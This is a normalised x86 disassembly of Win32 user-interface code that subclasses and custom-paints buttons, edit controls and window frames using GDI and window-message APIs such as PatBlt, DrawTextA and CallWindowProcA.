jb r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ ebx - 0x1c ]
push eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
test [ ebx ] di
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x10
retn
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov bx [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
push ecx
push ebx
push edi
push eax
push esi
mov eax ebp
shl eax 0x5
call [ eax + r--data ]
add esp 0x14
mov edi eax
cmp edi 0x1
jne r-xdata
sbb eax eax
pop ebp
inc eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
cmp bx 0x1
jne r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_419fc0
add esp 0x8
cmp edi 0x1
cmp [ rw-data ] 0x10
jne r-xdata
lea eax [ ebp + ebp * 2 ]
mov ecx [ eax * 8 + rw-data ]
push ecx
push esi
call sub_41a160
add esp 0x8
cmp edi 0x1
sbb eax eax
pop ebp
inc eax
pop edi
pop esi
pop ebx
add esp 0x10
retn
sub_41bc40
sub esp 0x10
lea eax [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x20 ]
push eax
push edi
call [ GetWindowRect@IAT ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
mov esi eax
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push 0x1
push 0x1
push eax
call [ InflateRect@IAT ]
push edi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
test esi 0x200000
je r-xdata
mov ecx [ eax + 0x18 ]
test cl 0xc0
jne r-xdata
lea eax [ esp + 0xc ]
push 0x0
push eax
push edi
call [ InvalidateRect@IAT ]
inc [ esp + 0x14 ]
and cl 0x3
cmp cl 0x2
jne r-xdata
test cl 0x2
je r-xdata
mov ecx [ esp + 0x14 ]
sub ecx [ eax + 0x10 ]
cmp ecx [ esp + 0xc ]
jne r-xdata
test cl 0x1
jne r-xdata
mov eax [ eax + 0x14 ]
mov ecx [ esp + 0x18 ]
sub ecx [ esp + 0x10 ]
cmp ecx eax
jl r-xdata
inc eax
add [ esp + 0x10 ] eax
sub_41bd00
sub esp 0x10
push ebx
push esi
push edi
push 0xfffffff0
mov edi [ esp + 0x24 ]
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
lea eax [ esp + 0xc ]
push eax
push edi
call [ GetWindowRect@IAT ]
lea ecx [ esp + 0xc ]
push 0x1
push 0x1
push ecx
call [ InflateRect@IAT ]
push edi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0xc ]
push eax
push edi
call ebx
lea ecx [ esp + 0x14 ]
push ecx
push edi
call ebx
test esi 0x200000
je r-xdata
lea eax [ esp + 0xc ]
push eax
push edi
call [ ValidateRect@IAT ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
inc [ esp + 0x14 ]
sub_41bd70
sub esp 0x1c
lea ecx [ esp + 0xc ]
push ebx
push esi
push edi
mov edi [ esp + 0x34 ]
push ebp
mov eax [ edi ]
mov edx [ edi + 0x4 ]
mov ebx [ edi + 0x8 ]
push 0xf
push 0x7
mov [ ecx ] eax
mov eax [ edi + 0xc ]
push 0x7
mov esi [ esp + 0x40 ]
push edi
push esi
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] ebx
mov [ ecx + 0xc ] eax
call sub_41a280
lea ecx [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push ecx
call [ InflateRect@IAT ]
cmp [ esp + 0x44 ] 0x1
jne r-xdata
push 0xf00021
mov eax [ edi + 0x4 ]
push 0x1
mov ecx [ edi ]
push 0x1
push eax
push ecx
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov ecx [ edi + 0x4 ]
push 0x1
mov eax [ edi + 0x8 ]
push 0x1
dec eax
push ecx
push eax
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov eax [ edi + 0xc ]
push 0x1
dec eax
push 0x1
mov ecx [ edi ]
push eax
push ecx
push esi
call [ PatBlt@IAT ]
push 0xf00021
mov eax [ edi + 0xc ]
push 0x1
dec eax
push 0x1
push eax
mov eax [ edi + 0x8 ]
dec eax
push eax
push esi
call [ PatBlt@IAT ]
cmp [ esp + 0x48 ] 0x1
sbb ebx ebx
neg ebx
inc ebx
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov eax [ esp + 0x30 ]
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jmp r-xdata
lea eax [ esp + 0x1c ]
push 0xf
push 0x7
push 0x7
push eax
push esi
call sub_41a280
lea eax [ esp + 0x30 ]
add esp 0x14
push 0xffffffff
push 0xffffffff
push eax
call [ InflateRect@IAT ]
mov eax [ rw-data ]
inc [ esp + 0x1c ]
inc [ esp + 0x20 ]
push eax
push esi
call [ SelectObject@IAT ]
mov eax [ esp + 0x28 ]
push 0xf00021
sub eax [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov ecx [ esp + 0x30 ]
push ecx
call [ IsWindowEnabled@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
xor ebp ebp
push eax
push esi
call [ SelectObject@IAT ]
dec [ esp + 0x28 ]
dec [ esp + 0x24 ]
test ebx ebx
jle r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x20 ]
push 0xf00021
mov edx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x24 ]
push eax
push ebx
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov eax [ esp + 0x24 ]
push 0xf00021
sub eax [ esp + 0x20 ]
push ebx
mov ecx [ esp + 0x28 ]
push eax
mov edx [ esp + 0x28 ]
push ecx
push edx
push esi
call [ PatBlt@IAT ]
cmp [ esp + 0x48 ] 0x0
jne r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x14 ]
mov ebx [ esp + 0x3c ]
push eax
push ecx
push ebx
push esi
call sub_41a470
mov eax [ esp + 0x38 ]
sub eax [ esp + 0x30 ]
sub eax [ esp + 0x28 ]
add esp 0x10
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x20 ] eax
mov eax [ esp + 0x24 ]
sub eax [ esp + 0x1c ]
sub eax [ esp + 0x14 ]
mov ecx [ esp + 0x28 ]
cdq
sub eax edx
sar eax 0x1
add [ esp + 0x1c ] eax
mov eax [ esp + 0x20 ]
add eax [ esp + 0x18 ]
cmp eax ecx
jl r-xdata
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x24 ]
push 0xf00021
sub eax [ esp + 0x20 ]
push 0x1
inc eax
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x24 ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
mov eax [ esp + 0x28 ]
push 0xf00021
sub eax [ esp + 0x24 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
push eax
push 0x1
push ecx
push edx
push esi
call [ PatBlt@IAT ]
lea ecx [ ebx - 0x1 ]
cmp ecx ebp
jle r-xdata
mov ecx [ esp + 0x24 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x1c ]
add eax [ esp + 0x14 ]
cmp eax ecx
jl r-xdata
mov eax ecx
inc ebp
cmp ebx ebp
jg r-xdata
lea eax [ esp + 0x1c ]
push 0xffffffff
push 0xffffffff
push eax
call [ InflateRect@IAT ]
cmp [ esp + 0x48 ] 0x0
mov [ esp + 0x24 ] eax
je r-xdata
mov eax ecx
lea eax [ esp + 0x1c ]
push 0x20
mov ecx [ esp + 0x44 ]
push eax
push ecx
push ebx
push esi
call [ DrawTextA@IAT ]
mov ebp [ GetFocus@IAT ]
call ebp
cmp eax [ esp + 0x30 ]
jne r-xdata
lea eax [ esp + 0x1c ]
push 0x1
push 0x1
mov ebp [ OffsetRect@IAT ]
push eax
call ebp
mov eax [ edi + 0x8 ]
mov ecx [ esp + 0x24 ]
sub eax 0x3
cmp eax ecx
jl r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
lea eax [ esp + 0x1c ]
push 0x1
push 0x1
push eax
call [ InflateRect@IAT ]
lea eax [ esp + 0x1c ]
push edi
push eax
lea eax [ esp + 0x24 ]
push eax
call [ IntersectRect@IAT ]
lea ecx [ esp + 0x1c ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x24 ] eax
mov eax [ edi + 0xc ]
sub eax 0x3
cmp eax ecx
jl r-xdata
mov eax ecx
pop ebp
pop edi
pop esi
pop ebx
add esp 0x1c
retn
mov eax [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x28 ] eax
mov eax ecx
sub_41c0b0
sub esp 0x154
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x168 ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
mov ebx eax
push edi
and eax 0x20
and ebx 0x1f
mov ebp [ GetParent@IAT ]
mov [ esp + 0x24 ] eax
call ebp
mov esi [ esp + 0x16c ]
push 0x2
mov [ esp + 0x20 ] eax
push esi
call [ SetBkMode@IAT ]
lea eax [ esp + 0x44 ]
mov ebp [ GetClientRect@IAT ]
push eax
push edi
call ebp
mov ebp [ esp + 0x48 ]
lea edx [ esp + 0x44 ]
lea ecx [ esp + 0x34 ]
mov eax [ edx ]
push 0x0
push 0x0
push 0x31
mov [ ecx ] eax
mov eax [ edx + 0x8 ]
push edi
mov edx [ edx + 0xc ]
mov [ ecx + 0x4 ] ebp
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
push 0xf
mov ebp [ GetSysColor@IAT ]
call ebp
push eax
push esi
call [ SetBkColor@IAT ]
push 0x12
call ebp
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x1c ]
push edi
push esi
push 0x135
push eax
call [ SendMessageA@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x40 ]
push eax
mov ebp [ IntersectClipRect@IAT ]
mov eax [ esp + 0x38 ]
push ecx
push edx
push eax
push esi
call ebp
mov ebp [ esp + 0x170 ]
test ebp 0x10
je r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov [ esp + 0x10 ] eax
push edi
call [ IsWindowEnabled@IAT ]
mov [ esp + 0x28 ] eax
push 0x0
push 0x0
push 0xf2
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0x18 ] 0x0
mov ecx eax
and ecx 0x3
mov [ esp + 0x30 ] ecx
cmp ecx 0x1
sbb ecx ecx
and eax 0x4
inc ecx
mov [ esp + 0x54 ] eax
sar eax 0x1
or eax ecx
mov edx eax
shl eax 0x3
sub eax edx
add eax eax
cmp [ esp + 0x28 ] 0x0
mov [ esp + 0x14 ] eax
jne r-xdata
cmp ebx 0x7
je r-xdata
test ebp 0xa
jne r-xdata
add ecx 0x2
mov eax ecx
shl ecx 0x3
sub ecx eax
mov eax [ esp + 0x14 ]
lea edx [ eax + ecx * 2 ]
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x40 ]
push 0xf00021
sub eax [ esp + 0x3c ]
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x38 ]
push eax
mov eax [ esp + 0x44 ]
sub eax [ esp + 0x3c ]
push eax
push ecx
push edx
push esi
call [ PatBlt@IAT ]
lea eax [ esp + 0x64 ]
push 0x100
push eax
push edi
call [ GetWindowTextA@IAT ]
mov [ esp + 0x24 ] eax
test ebx ebx
je r-xdata
mov eax [ esp + 0x2c ]
push eax
push esi
call [ SelectObject@IAT ]
cmp [ esp + 0x10 ] 0x0
je r-xdata
jmp [ ebx * 4 + jump_table_41c5d4 ]
cmp ebx 0x1
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x154
retn
mov eax [ esp + 0x10 ]
push eax
push esi
call [ SelectObject@IAT ]
mov eax [ esp + 0x54 ]
mov ecx [ esp + 0x24 ]
lea edx [ esp + 0x64 ]
push eax
lea eax [ esp + 0x48 ]
push ebx
push ecx
push edx
push eax
push esi
push edi
call sub_41bd70
add esp 0x1c
jmp r-xdata
mov [ esp + 0x18 ] 0xd
test ebp 0x4
je r-xdata
cmp [ esp + 0x30 ] 0x2
jne r-xdata
test ebp 0x6
je r-xdata
cmp ebx 0x9
ja r-xdata
test ebp 0x2
je r-xdata
push esi
call [ CreateCompatibleDC@IAT ]
mov edi eax
test edi edi
je r-xdata
mov [ esp + 0x18 ] 0x1a
jmp r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x30 ]
lea edx [ esp + 0x64 ]
push eax
push ecx
push edx
push esi
call sub_41a470
add esp 0x10
cmp [ esp + 0x20 ] 0x0
jne r-xdata
test ebp 0x8
je r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push edi
call [ SelectObject@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
add [ esp + 0x34 ] 0x4
mov eax [ esp + 0x30 ]
add eax [ esp + 0x34 ]
add eax 0x4
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x20 ]
add eax [ esp + 0x38 ]
test ebp 0x20
mov [ esp + 0x40 ] eax
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0x54 ]
push eax
push ecx
push rw-data
push esi
call sub_41a470
add esp 0x10
lea eax [ esp + 0x30 ]
lea ecx [ esp + 0x54 ]
lea edx [ esp + 0x64 ]
push eax
push ecx
push edx
push esi
call sub_41a470
mov eax [ esp + 0x50 ]
sub eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add esp 0x10
cdq
sub eax edx
sar eax 0x1
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x30 ]
add eax [ esp + 0x38 ]
cmp [ esp + 0x20 ] 0x0
mov [ esp + 0x40 ] eax
mov eax [ esp + 0x44 ]
je r-xdata
mov eax [ esp + 0x44 ]
add eax 0x12
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x4c ]
sub eax 0x12
mov [ esp + 0x3c ] eax
jmp r-xdata
push edi
call [ DeleteDC@IAT ]
mov eax [ esp + 0x18 ]
push 0xcc0020
mov ecx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x48 ]
push ecx
cmp [ esp + 0x2c ] 0x0
push edi
push 0xd
push 0xe
je r-xdata
mov eax [ esp + 0x20 ]
dec [ esp + 0x4c ]
dec [ esp + 0x50 ]
push 0xf
cdq
sub eax edx
push 0x2
sar eax 0x1
push 0x2
add [ esp + 0x54 ] eax
lea eax [ esp + 0x50 ]
push eax
push esi
call sub_41a280
lea eax [ esp + 0x58 ]
add esp 0x14
push 0x1
push 0x1
push eax
call [ OffsetRect@IAT ]
lea ecx [ esp + 0x44 ]
push 0xf
push 0x0
push 0x0
push ecx
push esi
call sub_41a280
add esp 0x14
cmp [ esp + 0x28 ] 0x0
jne r-xdata
mov ebx [ esp + 0x38 ]
mov ebp [ esp + 0x3c ]
lea ecx [ esp + 0x34 ]
lea edx [ esp + 0x54 ]
mov eax [ ecx ]
mov [ edx ] eax
mov eax [ ecx + 0xc ]
mov ecx [ esp + 0x4c ]
push edx
push edi
mov esi [ ClientToScreen@IAT ]
mov [ edx + 0x4 ] ebx
mov [ edx + 0x8 ] ebp
mov [ edx + 0xc ] eax
mov [ esp + 0x64 ] ecx
call esi
lea ecx [ esp + 0x5c ]
push ecx
push edi
call esi
lea eax [ esp + 0x54 ]
mov ecx [ esp + 0x1c ]
push eax
mov esi [ ScreenToClient@IAT ]
push ecx
call esi
lea ecx [ esp + 0x5c ]
mov eax [ esp + 0x1c ]
push ecx
push eax
call esi
lea ecx [ esp + 0x54 ]
push 0x1
mov edx [ esp + 0x20 ]
push ecx
push edx
call [ InvalidateRect@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x154
retn
add eax 0x12
mov [ esp + 0x34 ] eax
sub [ esp + 0x4c ] 0x12
mov [ esp + 0x34 ] eax
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x24
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x6c ]
push ecx
push edx
push esi
call [ DrawTextA@IAT ]
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
cmp [ esp + 0x28 ] 0x0
jne r-xdata
sub eax [ esp + 0x50 ]
mov ecx [ esp + 0x50 ]
sub eax 0xd
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x4c ]
push ecx
sub eax [ esp + 0x50 ]
mov ecx [ esp + 0x50 ]
sub eax 0xd
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax [ esp + 0x54 ]
push ecx
sub eax 0xe
jmp r-xdata
lea eax [ esp + 0x34 ]
push 0x20
mov ecx [ esp + 0x28 ]
push eax
lea edx [ esp + 0x6c ]
push ecx
push edx
push esi
call [ DrawTextA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push eax
push esi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x54 ]
push 0x1
add eax [ esp + 0x38 ]
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0x44 ] eax
push ecx
call [ InflateRect@IAT ]
lea ecx [ esp + 0x44 ]
lea eax [ esp + 0x34 ]
push ecx
push eax
lea eax [ esp + 0x3c ]
push eax
call [ IntersectRect@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push esi
call [ DrawFocusRect@IAT ]
push eax
push esi
call [ BitBlt@IAT ]
push ebx
push edi
call [ SelectObject@IAT ]
sub_41c600
sub esp 0x48
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x60 ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x5c ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x68 ]
push 0x0
mov ebx [ esp + 0x68 ]
push eax
mov esi [ esp + 0x64 ]
push ebx
push edi
push esi
call sub_41a1a0
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp edi 0xf1
mov eax edi
ja r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_419f70
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp eax 0xf3
je r-xdata
je r-xdata
mov ebp 0x4
cmp eax 0x1943
jb r-xdata
sub eax 0x7
cmp eax 0x8
ja r-xdata
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_419f70
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
cmp edi 0x7
je r-xdata
cmp eax 0x1944
jbe r-xdata
jmp [ eax * 4 + jump_table_41c8b0 ]
mov eax [ esp + 0x68 ]
mov ebx [ esp + 0x64 ]
push eax
push ebx
push edi
push esi
push 0x0
push esi
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov [ esp + 0x14 ] eax
cmp edi 0x7
je r-xdata
and eax 0xefffffff
push eax
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
mov eax [ esp + 0x68 ]
pop ebp
pop edi
pop esi
pop ebx
mov [ eax ] 0x1
mov eax 0x3e8
add esp 0x48
retn 0x10
mov ebp 0x16
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
and al 0x1f
cmp al 0x9
jne r-xdata
mov ebp 0x6
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov edi eax
mov ebx [ esp + 0x64 ]
mov ebp ebx
test ebp ebp
jne r-xdata
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov ebx eax
cmp edi 0xf3
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
or eax 0x10000000
push eax
push 0xfffffff0
push esi
call [ SetWindowLongA@IAT ]
push 0x0
push 0x0
push 0xf2
push esi
call [ SendMessageA@IAT ]
mov [ esp + 0x10 ] eax
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
xor ebp ebp
jmp r-xdata
push 0x0
push 0x0
push 0xf3
push esi
call [ SendMessageA@IAT ]
mov ebp 0x16
jmp r-xdata
and al 0x1f
cmp al 0x7
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
lea eax [ esp + 0x18 ]
mov ebp [ BeginPaint@IAT ]
push eax
push esi
call ebp
mov ebp eax
cmp ebx [ esp + 0x10 ]
je r-xdata
cmp edi 0xf1
jne r-xdata
mov ebp 0x22
jmp r-xdata
test ebx ebx
jne r-xdata
and edi 0x8
or edi 0x6
push edi
push ebp
push esi
call sub_41c0b0
add esp 0xc
mov eax [ esp + 0x14 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
push esi
call [ GetDC@IAT ]
mov edi eax
test edi edi
je r-xdata
xor eax eax
pop ebp
pop edi
pop esi
pop ebx
add esp 0x48
retn 0x10
lea eax [ esp + 0x18 ]
push eax
push esi
call [ EndPaint@IAT ]
xor ebx [ esp + 0x10 ]
test bl 0x3
je r-xdata
push esi
and ebx 0x8
push edi
or ebx ebp
call [ ExcludeUpdateRgn@IAT ]
push ebx
push edi
push esi
call sub_41c0b0
add esp 0xc
push edi
push esi
call [ ReleaseDC@IAT ]
or ebp 0x4
sub_41c8e0
sub esp 0x44
push ebx
push esi
mov esi [ esp + 0x50 ]
push edi
push ebp
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov [ esp + 0x10 ] eax
test eax 0x10000000
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
add esp 0x44
retn
cmp [ esp + 0x60 ] 0x3
jne r-xdata
cmp [ esp + 0x5c ] 0x0
je r-xdata
and al 0x3
cmp al 0x3
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push esi
call [ GetParent@IAT ]
mov edi eax
mov ebx [ ScreenToClient@IAT ]
lea eax [ esp + 0x24 ]
push eax
push edi
call ebx
lea ecx [ esp + 0x2c ]
mov bp 0xf
push ecx
push edi
call ebx
push edi
call [ GetDC@IAT ]
mov ebx eax
mov eax [ esp + 0x10 ]
and eax 0x100000
mov [ esp + 0x1c ] eax
je r-xdata
push esi
call [ HideCaret@IAT ]
push 0x0
push 0x0
push 0x157
push esi
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
and eax 0x200000
mov [ esp + 0x20 ] eax
je r-xdata
mov bp 0x7
push 0xfffffff4
push esi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0x5c ]
sub ecx eax
cmp ecx 0xfffffc18
jne r-xdata
and bp 0xfffb
lea eax [ esp + 0x24 ]
push ebp
push eax
push ebx
call sub_41a3c0
add esp 0xc
cmp [ esp + 0x60 ] 0x3
jne r-xdata
mov [ esp + 0x18 ] 0x29a
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x1944
push edi
call [ SendMessageA@IAT ]
cmp [ esp + 0x18 ] 0x29a
mov [ esp + 0x34 ] eax
jne r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
and al 0x3
cmp al 0x3
jne r-xdata
lea eax [ esp + 0x44 ]
push 0x10
push eax
push edi
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x44 ]
push r--data
push ecx
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
push eax
push 0x0
push 0x1943
push edi
call [ SendMessageA@IAT ]
mov [ esp + 0x34 ] eax
cmp [ esp + 0x1c ] 0x0
je r-xdata
lea eax [ esp + 0x24 ]
push 0x4
inc [ esp + 0x30 ]
push 0x0
push 0x0
push eax
push ebx
call sub_41a280
mov eax [ esp + 0x38 ]
dec [ esp + 0x40 ]
mov ebp [ esp + 0x40 ]
mov [ esp + 0x58 ] eax
add esp 0x14
push 0x2
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0x8
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x2c ] ebp
push 0x7
push eax
push ebx
call sub_41a280
mov eax [ esp + 0x58 ]
mov [ esp + 0x38 ] eax
add esp 0x14
mov ebp [ esp + 0x2c ]
push 0x2
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0xc
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x2c ] ebp
push 0x7
push eax
push ebx
call sub_41a280
add esp 0x14
push esi
call sub_41bd00
add esp 0x4
jmp r-xdata
push edi
call [ GetParent@IAT ]
mov [ esp + 0x14 ] eax
push 0x2
lea eax [ esp + 0x28 ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push edi
call [ MapWindowPoints@IAT ]
push ebx
push edi
call [ ReleaseDC@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
call [ GetDC@IAT ]
cmp [ esp + 0x5c ] 0x0
mov ebx eax
je r-xdata
cmp [ esp + 0x18 ] 0x1
jne r-xdata
push ebx
push edi
call [ ReleaseDC@IAT ]
cmp [ esp + 0x5c ] 0x0
je r-xdata
lea eax [ esp + 0x24 ]
push 0x8
inc [ esp + 0x34 ]
push 0x0
push 0x0
push eax
push ebx
call sub_41a280
dec [ esp + 0x44 ]
add esp 0x14
mov ebp [ esp + 0x30 ]
push 0x15
call [ GetSystemMetrics@IAT ]
sub ebp eax
push 0x4
lea eax [ esp + 0x28 ]
push 0x7
mov [ esp + 0x30 ] ebp
push 0x7
push eax
push ebx
call sub_41a280
add esp 0x14
and bp 0xfffd
inc [ esp + 0x28 ]
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
and eax 0x3
cmp eax 0x2
je r-xdata
cmp [ esp + 0x34 ] 0x3eb
jne r-xdata
push esi
call [ ShowCaret@IAT ]
push 0x0
push 0x0
push 0x157
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp eax 0x3
je r-xdata
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
push ebx
push eax
call [ ReleaseDC@IAT ]
push esi
call [ ShowCaret@IAT ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x44
retn
and bp 0xfff7
push 0x5
push edi
call [ GetWindow@IAT ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
call [ GetWindowRect@IAT ]
mov eax [ esp + 0x34 ]
push 0x1008
sub eax [ esp + 0x40 ]
lea ecx [ esp + 0x28 ]
add [ esp + 0x30 ] eax
push ecx
push ebx
call sub_41a3c0
mov eax [ esp + 0x48 ]
sub eax [ esp + 0x40 ]
add [ esp + 0x38 ] eax
add esp 0xc
jmp r-xdata
sub_41cc20
sub esp 0x4
push ebx
push esi
push edi
push ebp
mov edi [ esp + 0x1c ]
cmp edi 0x82
jne r-xdata
xor eax eax
mov esi [ esp + 0x18 ]
mov ax [ rw-data ]
push eax
push esi
call [ GetPropA@IAT ]
mov ebp [ esp + 0x24 ]
test eax eax
mov eax [ esp + 0x20 ]
push ebp
mov ebx [ esp + 0x2c ]
push eax
push edi
push esi
push ebx
push esi
je r-xdata
mov ebx [ esp + 0x28 ]
mov ebp [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push ebx
mov esi [ esp + 0x1c ]
push ebp
push eax
push edi
push esi
call sub_41a1a0
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
call sub_419f70
add esp 0x8
push eax
call [ CallWindowProcA@IAT ]
mov [ esp + 0x10 ] eax
cmp ebx 0x3
jne r-xdata
call sub_419f70
add esp 0x8
mov ebp [ CallWindowProcA@IAT ]
push eax
call ebp
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
mov eax [ esp + 0x10 ]
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
mov ecx eax
and cl 0x3
cmp cl 0x2
jne r-xdata
cmp edi 0x46
je r-xdata
je r-xdata
cmp edi 0x18
ja r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
cmp [ rw-data ] 0x30a
jb r-xdata
cmp edi 0x1943
jb r-xdata
cmp [ rw-data ] 0x30a
jae r-xdata
cmp edi 0xf
je r-xdata
mov eax [ esp + 0x10 ]
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
push ebp
push esi
call sub_41bc40
add esp 0x8
jmp r-xdata
cmp edi 0x1944
jbe r-xdata
cmp [ esp + 0x20 ] 0x0
jne r-xdata
cmp ebx 0x3
jne r-xdata
mov eax 0x3ea
mov [ ebp ] 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x4
retn
